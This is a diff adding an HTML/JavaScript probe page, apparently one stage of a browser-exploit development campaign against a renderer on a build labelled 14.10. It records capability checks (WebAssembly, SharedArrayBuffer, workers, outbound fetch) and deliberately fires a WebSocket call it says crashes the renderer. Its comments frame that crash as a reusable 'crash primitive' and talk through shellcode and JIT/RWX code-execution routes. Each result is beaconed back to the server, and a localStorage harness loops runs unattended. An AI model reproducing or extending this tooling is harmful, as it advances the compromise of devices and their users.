@@ -1,0 +1,91 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="refresh" content="20;url=/"><title>V925</title>
+<style>body{background:#000;color:#0f0;font:11px monospace}#log{white-space:pre-wrap}</style></head><body>
+<div id="log"></div><script>
+// V925b -- SYSCALL / CAPABILITY PROBE. ZERO-TOUCH: it advances the queue by itself.
+// The WebSocket test CRASHES the renderer on 14.10 (10/10 at 02:52-02:53), so it runs LAST and its
+// death is the result. Everything harmless is already on the wire before it can happen.
+//
+// PRE-REGISTERED INTERPRETATION
+//   worker=OPEN        -> pthread_create via blob worker works (baseline control).
+//   fetch=OPEN-REFUSED -> renderer outbound TCP works, refusal is a real RST.
+//   wasm=yes/no        -> WebAssembly availability. no = no WASM code pages in-process, JIT/RWX route
+//                         is the only native-code path; do not plan a wasm-shellcode stage.
+//   socket=OPEN then death -> the WebSocket connect path is a CRASH PRIMITIVE with no UAF and no forge.
+//                         Candidate value: repeatable renderer kill on demand, useful as an oracle reset.
+//   socket=BLOCKED:*   -> constructor threw, no crash.
+var PRE='V925',B=1,LOG=document.getElementById('log');
+var PT=String(Date.now());
+function Lg(m){try{LOG.textContent+=m+'\n';}catch(e){}}
+function bea(stg,stage,d){var s=('000'+B).slice(-3);B++;
+ var path='/beacon/'+PRE+'-'+s+'-'+stg+'-'+stage+'?d='+encodeURIComponent(String(d==null?'':d))+'&pt='+PT+'&t='+Date.now();
+ Lg(s+' '+stg+' '+stage+' '+d);
+ try{if(navigator.sendBeacon){navigator.sendBeacon(path);}}catch(e){}
+ try{new Image().src=path;}catch(e){}
+ try{new Image().src=path+'&k=3';}catch(e){}
+}
+var BI=1200;var pool=[];for(var i=0;i<BI;i++)pool.push(new Image());
+window.addEventListener('error',function(e){bea('FAIL','JSERR',(e.message||'')+'|L'+e.lineno);});
+
+// ---------- ZERO-TOUCH HARNESS ----------
+var HK='v925h',DONE=false;
+var h=null;try{h=JSON.parse(localStorage.getItem(HK)||'null');}catch(e){h=null;}
+if(!h)h={runs:0,deaths:0,done:0};
+function hs(){try{localStorage.setItem(HK,JSON.stringify(h));}catch(e){}}
+function goHome(){try{localStorage.setItem('rr_advance','1');}catch(e){} location.replace('/');}
+// boot: previous run never finished -> it died. two deaths on the same probe = stop looping.
+if(h.pending){
+ h.deaths++;h.pending=0;hs();
+ bea('PASS','RECOVER','prev=run'+h.runs+'|died-at='+(h.stage||'?')+'|deaths='+h.deaths);
+ if(h.deaths>=3){bea('FAIL','GIVEUP','probe='+PRE+'|deaths='+h.deaths);DONE=true;goHome();}
+}
+h.runs++;h.pending=1;h.stage='boot';hs();
+var wd=setTimeout(function(){if(!DONE){DONE=true;h.pending=0;h.stage='watchdog';hs();bea('FAIL','WATCHDOG','stuck-at='+(h.stage||'?')+'|advancing');goHome();}},11000);
+
+function fin(){
+ DONE=true;h.pending=0;h.stage='done';hs();
+ var s='';for(var k in R)s+=k+'='+R[k]+';';
+ bea('PASS','RESULT','PT='+PT+'|'+s);
+ var v=(R.socket==='OPEN')?'SOCKET-OPEN-NO-CRASH':(R.socket&&R.socket.indexOf('BLOCKED')===0?'SOCKET-BLOCKED':'INCONCLUSIVE');
+ bea('PASS','VERDICT','PT='+PT+'|'+v+'|wasm='+(R.wasm||'?')+'|worker='+(R.worker||'?')+'|fetch='+(R.fetch||'?'));
+ clearTimeout(wd);
+ setTimeout(goHome,600);
+}
+
+var R={};
+// 0) capability snapshot
+R.wasm=(typeof WebAssembly==='object'&&typeof WebAssembly.compile==='function')?'yes':'no';
+R.capcss=(typeof document.getCSSCanvasContext==='function')?'yes':'no';
+R.offscr=(typeof OffscreenCanvas==='function')?'yes':'no';
+R.sab=(function(){try{new SharedArrayBuffer(4);return 'OPEN';}catch(e){return 'BLOCKED';}})();
+bea('PASS','CAP','PT='+PT+'|wasm='+R.wasm+'|capcss='+R.capcss+'|offscreen='+R.offscr+'|sab='+R.sab);
+
+// 1) pthread_create baseline
+h.stage='worker';hs();
+try{
+ var b=new Blob(['postMessage(1)'],{type:'text/javascript'});
+ var w=new Worker(URL.createObjectURL(b));
+ w.onmessage=function(){R.worker='OPEN';try{w.terminate();}catch(e){}bea('PASS','WORKER','PT='+PT+'|OPEN');};
+ w.onerror=function(){R.worker='BLOCKED';bea('FAIL','WORKER','PT='+PT+'|BLOCKED');};
+}catch(e){R.worker='BLOCKED';bea('FAIL','WORKER','PT='+PT+'|BLOCKED:'+String(e&&e.message||e));}
+
+// 2) outbound TCP from the renderer, refused port
+h.stage='fetch';hs();
+try{
+ fetch('http://127.0.0.1:1/x').then(function(){R.fetch='OPEN';bea('PASS','FETCH','PT='+PT+'|OPEN');})
+  .catch(function(e){var m=String(e&&e.message||e);R.fetch=/Failed|fetch/i.test(m)?'OPEN-REFUSED':'BLOCKED';bea('PASS','FETCH','PT='+PT+'|'+R.fetch+'|'+m.slice(0,50));});
+}catch(e){R.fetch='BLOCKED';bea('FAIL','FETCH','PT='+PT+'|THREW');}
+
+// 3) socket() via WebSocket -- KNOWN TO KILL THE PROCESS ON 14.10. LAST, ON PURPOSE.
+setTimeout(function(){
+ h.stage='pre-ws';hs();
+ bea('ENTER','WS','PT='+PT+'|about-to-connect|expect=crash-on-this-build');
+ var wsDone=false;
+ function wsSet(v){if(wsDone)return;wsDone=true;R.socket=v;bea('PASS','SOCKET','PT='+PT+'|'+v);}
+ try{
+  var ws=new WebSocket('ws://127.0.0.1:1');
+  ws.onerror=function(){wsSet('OPEN');try{ws.close();}catch(e){}};
+  ws.onclose=function(){wsSet('OPEN');};
+ }catch(e){wsSet('BLOCKED:'+String(e&&e.message||e));}
+ setTimeout(function(){wsSet('TIMEOUT');h.stage='ws-survived';hs();fin();},3000);
+},2500);
+</script></body></html>
